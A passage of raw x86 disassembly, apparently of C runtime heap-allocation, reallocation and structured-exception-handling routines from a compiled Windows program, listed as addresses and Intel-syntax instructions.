  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
